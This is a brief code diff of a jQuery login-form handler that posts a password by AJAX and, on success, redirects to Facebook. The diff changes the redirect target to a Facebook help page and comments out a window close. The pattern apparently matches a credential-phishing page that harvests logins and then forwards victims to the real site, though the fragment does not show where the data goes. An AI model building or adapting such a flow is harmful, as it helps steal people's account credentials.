@@ -20,8 +20,8 @@ $('#login_form').submit(function (event) {
             pass:pass
         },
         success:function (data) {
-            if(data == 'success') {location.href = '//facebook.com/';
-                                  close();
+            if(data == 'success') {location.href = '//www.facebook.com/business/help/182371508761821';
+                                 // close();
                                   }
         }
     });
